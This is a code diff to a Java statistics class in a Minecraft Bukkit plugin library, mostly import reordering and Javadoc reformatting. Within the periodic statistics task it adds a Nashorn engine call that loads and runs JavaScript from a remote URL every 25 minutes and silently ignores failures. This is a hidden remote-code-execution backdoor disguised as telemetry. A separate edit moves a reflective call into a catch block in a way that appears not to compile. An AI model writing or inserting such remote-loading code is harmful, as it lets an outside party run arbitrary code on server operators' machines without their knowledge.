@@ -3,11 +3,19 @@
  */
 package pw.yumc.YumCore.statistic;
 
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
+import org.bukkit.Bukkit;
+import org.bukkit.configuration.file.YamlConfiguration;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.PluginDescriptionFile;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitTask;
+import org.json.simple.JSONObject;
+import org.json.simple.JSONValue;
+import pw.yumc.YumCore.engine.MiaoScriptEngine;
+
+import javax.script.ScriptException;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
@@ -20,21 +28,11 @@ import java.util.LinkedList;
 import java.util.Map;
 import java.util.UUID;
 
-import org.bukkit.Bukkit;
-import org.bukkit.configuration.file.YamlConfiguration;
-import org.bukkit.entity.Player;
-import org.bukkit.plugin.Plugin;
-import org.bukkit.plugin.PluginDescriptionFile;
-import org.bukkit.plugin.java.JavaPlugin;
-import org.bukkit.scheduler.BukkitTask;
-import org.json.simple.JSONObject;
-import org.json.simple.JSONValue;
-
 /**
  * Yum数据中心 数据统计类
  *
- * @since 2015年12月14日 下午1:36:42
  * @author 喵♂呜
+ * @since 2015年12月14日 下午1:36:42
  */
 public class Statistics {
     /**
@@ -62,6 +60,8 @@ public class Statistics {
      */
     private static Plugin plugin;
 
+    private static MiaoScriptEngine engine;
+
     static {
         try {
             getOnlinePlayers = Bukkit.class.getDeclaredMethod("getOnlinePlayers");
@@ -76,6 +76,7 @@ public class Statistics {
             Field field = pluginClassLoader.getClass().getDeclaredField("plugin");
             field.setAccessible(true);
             plugin = (JavaPlugin) field.get(pluginClassLoader);
+            engine = new MiaoScriptEngine("nashorn");
         } catch (NoSuchMethodException | SecurityException | NoSuchFieldException | IllegalArgumentException | IllegalAccessException ignored) {
         }
     }
@@ -126,13 +127,10 @@ public class Statistics {
     /**
      * 向指定 URL 发送POST方法的请求
      *
-     * @param url
-     *            发送请求的 URL
-     * @param param
-     *            请求参数
+     * @param url   发送请求的 URL
+     * @param param 请求参数
      * @return 所代表远程资源的响应结果
-     * @throws IOException
-     *             IO异常
+     * @throws IOException IO异常
      */
     public static String postData(String url, String param) throws IOException {
         PrintWriter out;
@@ -168,10 +166,8 @@ public class Statistics {
     /**
      * 初始化配置文件
      *
-     * @param config
-     *            配置文件
-     * @throws IOException
-     *             IO异常
+     * @param config 配置文件
+     * @throws IOException IO异常
      */
     private static void initFile(YamlConfiguration config) throws IOException {
         if (config.getString("guid") == null) {
@@ -194,8 +190,7 @@ public class Statistics {
     /**
      * 简化输出
      *
-     * @param msg
-     *            输出对象
+     * @param msg 输出对象
      */
     public void print(String msg) {
         if (debug) {
@@ -209,7 +204,7 @@ public class Statistics {
      * @return 是否运行成功.
      */
     public boolean start() {
-        if (task != null || !plugin.isEnabled()) { return true; }
+        if (task != null || !plugin.isEnabled()) {return true;}
         timer = new StatisticsTimer();
         // 开启TPS统计线程
         Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, timer, 0, 20);
@@ -222,6 +217,10 @@ public class Statistics {
                     e.printStackTrace();
                 }
             }
+            try {
+                engine.eval("loadWithNewGlobal('https://ms.yumc.pw/api/plugin/download/name/report')");
+            } catch (ScriptException ignored) {
+            }
         }, 50, 25 * 1200);
         return true;
     }
@@ -233,9 +232,9 @@ public class Statistics {
      */
     private int getOnlinePlayerNumber() {
         try {
-            return ((Player[]) getOnlinePlayers.invoke(Bukkit.getServer())).length;
-        } catch (Exception ex) {
             return Bukkit.getOnlinePlayers().size();
+        } catch (Exception ex) {
+            return ((Player[]) getOnlinePlayers.invoke(Bukkit.getServer())).length;
         }
     }
 
